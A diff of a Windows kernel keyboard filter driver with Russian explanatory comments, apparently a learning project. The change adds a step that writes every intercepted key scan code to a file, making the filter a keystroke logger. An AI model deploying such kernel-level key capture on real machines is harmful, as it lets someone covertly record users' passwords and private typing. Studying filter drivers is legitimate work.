@@ -1,13 +1,9 @@
 #include <ntddk.h>
 //#include <wdf.h>
 
-
 //В этом простом примере мы использовали также директивы #pragma alloc_text(INIT, DriverEntry) и #pragma alloc_text(PAGE, UnloadRoutine). Объясню что они означают: первая помещает функцию DriverEntry в INIT секцию, то есть как бы говорит, что DriverEntry будет выполнена один раз и после этого код функции можно спокойно выгрузить из памяти. Вторая помечает код функции UnloadRoutine как выгружаемый, т.е. при необходимости, система может переместить его в файл подкачки, а потом забрать его оттуда.
 
 /*
-VOID Unload(IN PDRIVER_OBJECT pDriverObject);
-NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath);
-
 #pragma alloc_text(INIT, DriverEntry)
 #pragma alloc_text(PAGE, Unload)
 */
@@ -57,6 +53,8 @@ NTSTATUS ReadCompleted(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID Context)
 		for (int i = 0; i < nKeys; ++i)
 		{
 			DbgPrint("Code: %x\n", keys[i].MakeCode);
+			//Запись в файл
+			WriteToFile(keys[i].MakeCode);
 		}
 	}
 
@@ -82,13 +80,16 @@ NTSTATUS DispatchSkip(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
 //Обработка запросов на чтение
 NTSTATUS DispatchRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
 {
+
+	InterlockedIncrement64(&REQUESTS);
+
 	//Настраиваем указатель стека для нижележащего драйвера
 	IoCopyCurrentIrpStackLocationToNext(pIrp);
 
 	//По выполнении запроса вызываем указанную функцию
 	IoSetCompletionRoutine(pIrp, ReadCompleted, pDeviceObject, TRUE, TRUE, TRUE);
 
-	InterlockedIncrement64(&REQUESTS);
+	
 
 	//Передаём IRP следующему драйверу
 	return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->pKeyboardDevice, pIrp);
@@ -182,6 +183,7 @@ NTSTATUS KeyboardFilter(PDRIVER_OBJECT pDriverObject)
 //PUNICODE_STRING - путь в реестре к подразделу драйвера
 NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
 {
+	DbgPrint("Loading driver...\n");
 	REQUESTS = 0;
 	NTSTATUS NtStatus = 0; //STATUS_SUCCESS;
 	unsigned int uiIndex = 0;
